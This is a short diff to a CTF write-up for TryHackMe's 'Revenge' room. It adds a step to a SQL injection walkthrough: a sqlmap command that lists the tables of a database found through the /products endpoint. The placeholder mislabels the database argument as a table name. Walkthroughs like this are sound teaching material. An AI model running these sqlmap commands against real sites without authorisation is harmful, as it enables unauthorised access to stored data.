@@ -8,3 +8,9 @@ in the CTF by THM named Revenge, i found such a directory named /products. the p
 sqlmap -u http://<target_ip>/products/1 --dbs
 ```
 in this manner, the database of the website were enumerated
+
+now for fetching the contents of the database, use the following command:
+
+```bash
+sqlmap -u http://<target_ip>/products/1 --batch -D <table_name> --tables
+```
